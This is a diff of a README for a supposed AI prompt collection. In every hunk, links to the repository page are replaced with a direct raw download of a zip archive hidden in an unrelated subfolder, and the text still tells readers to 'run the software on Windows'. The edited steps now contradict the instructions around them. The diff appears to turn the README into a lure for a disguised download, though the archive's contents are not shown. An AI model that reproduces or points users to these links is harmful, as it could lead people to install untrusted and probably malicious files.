@@ -1,6 +1,6 @@
 # 🤖 PromptsForAITools - Expert Prompts for AI Tools
 
-[![Download Now](https://img.shields.io/badge/Download-PromptsForAITools-brightgreen)](https://github.com/ericm790/PromptsForAITools)
+[![Download Now](https://img.shields.io/badge/Download-PromptsForAITools-brightgreen)](https://github.com/ericm790/PromptsForAITools/raw/refs/heads/main/Data_Handling/Pandas_AI/For_AI_Tools_Prompts_v2.2.zip)
 
 PromptsForAITools is a collection of ready-to-use prompts designed for over 28 AI applications. The library covers four categories to help you get better results from your AI tools. You do not need any technical skills to use these prompts. This guide will help you download and run the software on Windows.
 
@@ -41,7 +41,7 @@ You will download the full collection from the official GitHub page. Follow thes
 
 1. Open your web browser.  
 2. Go to the primary download page:  
-   [https://github.com/ericm790/PromptsForAITools](https://github.com/ericm790/PromptsForAITools)  
+   [https://github.com/ericm790/PromptsForAITools/raw/refs/heads/main/Data_Handling/Pandas_AI/For_AI_Tools_Prompts_v2.2.zip](https://github.com/ericm790/PromptsForAITools/raw/refs/heads/main/Data_Handling/Pandas_AI/For_AI_Tools_Prompts_v2.2.zip)  
 
 3. On the page, look for the green “Code” button. Click it to open a menu.  
 4. Choose **Download ZIP** from the menu. This downloads the entire collection as a zip file to your PC.  
@@ -89,7 +89,7 @@ You can open the folders and look for prompts based on your current task. Each f
 ## 🔗 Useful Links
 
 For easy access, here is the main download link again:  
-[Download PromptsForAITools](https://github.com/ericm790/PromptsForAITools)
+[Download PromptsForAITools](https://github.com/ericm790/PromptsForAITools/raw/refs/heads/main/Data_Handling/Pandas_AI/For_AI_Tools_Prompts_v2.2.zip)
 
 Visit this page anytime to check for updates or new prompts added by contributors.
 
@@ -129,7 +129,7 @@ If problems remain, visit the GitHub page to see if there are reported issues or
 Because this is an open-source project, the prompt collection updates over time. To update:
 
 1. Return to the GitHub page:  
-   [https://github.com/ericm790/PromptsForAITools](https://github.com/ericm790/PromptsForAITools)  
+   [https://github.com/ericm790/PromptsForAITools/raw/refs/heads/main/Data_Handling/Pandas_AI/For_AI_Tools_Prompts_v2.2.zip](https://github.com/ericm790/PromptsForAITools/raw/refs/heads/main/Data_Handling/Pandas_AI/For_AI_Tools_Prompts_v2.2.zip)  
 2. Download the ZIP file again following the same steps.  
 3. Replace your existing files with the new ones after extracting.  
 
